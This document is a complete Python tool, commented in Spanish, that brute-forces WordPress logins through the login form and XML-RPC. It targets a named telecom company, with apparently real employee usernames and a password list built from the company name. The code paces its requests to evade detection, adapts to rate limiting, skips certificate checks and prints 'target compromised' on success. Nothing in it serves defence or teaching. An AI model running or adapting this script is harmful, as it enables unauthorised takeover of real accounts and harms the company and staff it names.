#!/usr/bin/env python3
import urllib.request
import urllib.error
import urllib.parse
import ssl
import threading
import time
import sys
from datetime import datetime

class WordPressBruteForce:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.success = []
        self.failed = []
        self.lock = threading.Lock()
        self.request_delay = 0.5  # Delay entre requests para evitar detección
        
        # Usuarios encontrados en el análisis previo
        self.users = [
            'angel-rosillodigimobil-es',
            'carlos-perezdigimobil-es', 
            'diego-rosel',
            'andresc',
            'digi_es',
            'eduardo',
            'gemma-tejedor',
            'ignacio'
        ]
        
        # Usuarios adicionales comunes
        self.users.extend(['admin', 'administrator', 'digimobil', 'user'])
    
    def generate_password_list(self):
        """Generar lista de contraseñas basada en el contexto"""
        passwords = [
            # Contraseñas comunes
            'admin', 'password', '123456', 'password123', 'admin123',
            'qwerty', 'letmein', 'welcome', 'monkey', 'dragon',
            
            # Basadas en la empresa
            'digimobil', 'Digimobil', 'DIGIMOBIL', 'digimobil123',
            'digimobil2024', 'digimobil2023', 'digi123', 'digi2024',
            
            # Patrones españoles comunes
            'hola', 'españa', 'madrid', 'barcelona', 'telefono',
            'movil', 'internet', 'fibra', 'wifi',
            
            # Variaciones de nombres de usuarios
            'angel', 'carlos', 'diego', 'andres', 'eduardo', 'gemma', 'ignacio',
            
            # Contraseñas débiles comunes
            '12345', '123456789', 'abc123', 'password1', 'welcome123',
            'test', 'test123', 'demo', 'demo123',
            
            # Fechas y años
            '2024', '2023', '2022', '2021', '2020',
            
            # Combinaciones
            'admin2024', 'user123', 'test2024'
        ]
        
        # Generar variaciones adicionales
        additional = []
        for pwd in passwords[:20]:  # Solo para las primeras 20
            additional.extend([
                pwd + '!',
                pwd + '123',
                pwd + '2024',
                pwd.capitalize(),
                pwd.upper()
            ])
        
        passwords.extend(additional)
        return list(set(passwords))  # Eliminar duplicados
    
    def attempt_login(self, username, password):
        """Intentar login con credenciales específicas"""
        try:
            # Datos del formulario de login
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f'{self.target}/wp-admin/',
                'testcookie': '1'
            }
            
            # Codificar datos
            post_data = urllib.parse.urlencode(data).encode('utf-8')
            
            # Crear request
            req = urllib.request.Request(f'{self.target}/wp-login.php', post_data)
            req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('Referer', f'{self.target}/wp-login.php')
            
            # Manejar HTTPS
            if self.target.startswith('https'):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                response = urllib.request.urlopen(req, timeout=10, context=ctx)
            else:
                response = urllib.request.urlopen(req, timeout=10)
            
            content = response.read().decode('utf-8', errors='ignore')
            
            # Verificar si el login fue exitoso
            if 'wp-admin' in response.geturl() and 'wp-login.php' not in response.geturl():
                with self.lock:
                    self.success.append((username, password))
                    print(f"[+] ÉXITO: {username}:{password}")
                return True
            elif 'dashboard' in content.lower() or 'welcome' in content.lower():
                with self.lock:
                    self.success.append((username, password))
                    print(f"[+] ÉXITO: {username}:{password}")
                return True
            else:
                # Verificar mensajes de error específicos
                if 'incorrect password' in content.lower():
                    print(f"[-] Usuario válido, contraseña incorrecta: {username}")
                elif 'invalid username' in content.lower():
                    print(f"[-] Usuario inválido: {username}")
                else:
                    print(f"[-] Falló: {username}:{password}")
                
                with self.lock:
                    self.failed.append((username, password))
                return False
                
        except urllib.error.HTTPError as e:
            if e.code == 429:
                print(f"[!] Rate limiting detectado, aumentando delay")
                self.request_delay *= 2
                time.sleep(5)
            return False
        except Exception as e:
            print(f"[-] Error con {username}:{password} - {e}")
            return False
    
    def brute_force_user(self, username, passwords):
        """Brute force para un usuario específico"""
        print(f"\n=== Atacando usuario: {username} ===")
        
        for password in passwords:
            if self.attempt_login(username, password):
                print(f"[!] ACCESO OBTENIDO: {username}:{password}")
                return True
            
            # Delay entre intentos
            time.sleep(self.request_delay)
            
            # Aumentar delay si detectamos muchos fallos
            if len(self.failed) > 0 and len(self.failed) % 20 == 0:
                self.request_delay = min(self.request_delay * 1.2, 3.0)
        
        return False
    
    def smart_brute_force(self):
        """Brute force inteligente con estrategias adaptativas"""
        print(f"=== Brute Force Inteligente contra {self.target} ===")
        print(f"Iniciado: {datetime.now()}")
        print("=" * 60)
        
        passwords = self.generate_password_list()
        print(f"Usuarios objetivo: {len(self.users)}")
        print(f"Contraseñas a probar: {len(passwords)}")
        print(f"Total combinaciones: {len(self.users) * len(passwords)}")
        
        # Estrategia 1: Probar contraseñas más comunes primero
        common_passwords = ['admin', 'password', '123456', 'digimobil', 'admin123']
        
        print(f"\n=== Fase 1: Contraseñas más comunes ===")
        for username in self.users:
            for password in common_passwords:
                if self.attempt_login(username, password):
                    return True
                time.sleep(self.request_delay)
        
        # Estrategia 2: Usuarios más probables con más contraseñas
        priority_users = ['admin', 'administrator', 'digi_es', 'andresc']
        
        print(f"\n=== Fase 2: Usuarios prioritarios ===")
        for username in priority_users:
            if username in self.users:
                if self.brute_force_user(username, passwords[:50]):  # Top 50 passwords
                    return True
        
        # Estrategia 3: Todos los usuarios con contraseñas restantes
        print(f"\n=== Fase 3: Ataque completo ===")
        for username in self.users:
            if username not in priority_users:
                if self.brute_force_user(username, passwords[:30]):  # Top 30 passwords
                    return True
        
        return False
    
    def xml_rpc_brute_force(self):
        """Brute force via XML-RPC (más rápido si está disponible)"""
        print(f"\n=== Intentando brute force via XML-RPC ===")
        
        # Verificar si XML-RPC está disponible
        try:
            req = urllib.request.Request(f'{self.target}/xmlrpc.php')
            response = urllib.request.urlopen(req, timeout=5)
            content = response.read().decode('utf-8', errors='ignore')
            
            if 'XML-RPC server' not in content:
                print("[-] XML-RPC no disponible")
                return False
                
        except:
            print("[-] No se puede acceder a XML-RPC")
            return False
        
        print("[+] XML-RPC disponible, intentando brute force")
        
        # Probar múltiples credenciales en una sola petición
        passwords = self.generate_password_list()[:20]  # Top 20
        
        for username in self.users[:5]:  # Top 5 usuarios
            for password in passwords:
                xmlrpc_data = f'''<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>'''
                
                try:
                    req = urllib.request.Request(f'{self.target}/xmlrpc.php', xmlrpc_data.encode())
                    req.add_header('Content-Type', 'text/xml')
                    response = urllib.request.urlopen(req, timeout=10)
                    content = response.read().decode('utf-8', errors='ignore')
                    
                    if 'faultCode' not in content and 'incorrect' not in content.lower():
                        print(f"[+] ÉXITO XML-RPC: {username}:{password}")
                        self.success.append((username, password))
                        return True
                    else:
                        print(f"[-] XML-RPC falló: {username}:{password}")
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    print(f"[-] Error XML-RPC: {e}")
        
        return False
    
    def comprehensive_attack(self):
        """Ataque completo combinando múltiples técnicas"""
        print(f"=== ATAQUE COMPLETO A WORDPRESS ===")
        print(f"Objetivo: {self.target}")
        print(f"Iniciado: {datetime.now()}")
        print("=" * 60)
        
        # Intentar XML-RPC primero (más rápido)
        if self.xml_rpc_brute_force():
            print(f"\n[!] ACCESO OBTENIDO VIA XML-RPC")
        else:
            # Brute force tradicional
            if self.smart_brute_force():
                print(f"\n[!] ACCESO OBTENIDO VIA LOGIN FORM")
        
        # Resumen final
        print(f"\n=== RESUMEN DEL ATAQUE ===")
        print(f"Credenciales exitosas: {len(self.success)}")
        print(f"Intentos fallidos: {len(self.failed)}")
        
        if self.success:
            print(f"\n[!] CREDENCIALES VÁLIDAS ENCONTRADAS:")
            for username, password in self.success:
                print(f"  - {username}:{password}")
                
            print(f"\n[!] ACCESO OBTENIDO AL SISTEMA")
            print(f"[!] URL de administración: {self.target}/wp-admin/")
            print(f"[!] El objetivo ha sido comprometido exitosamente")
        else:
            print(f"\n[-] No se encontraron credenciales válidas")
            print(f"[-] Posibles contramedidas:")
            print(f"    - Protección contra brute force activa")
            print(f"    - Contraseñas fuertes en uso")
            print(f"    - Rate limiting implementado")

def main():
    if len(sys.argv) != 2:
        print("Uso: python3 wordpress_bruteforce.py <URL>")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith('http'):
        target = f"http://{target}"
    
    brute_force = WordPressBruteForce(target)
    brute_force.comprehensive_attack()

if __name__ == "__main__":
    main()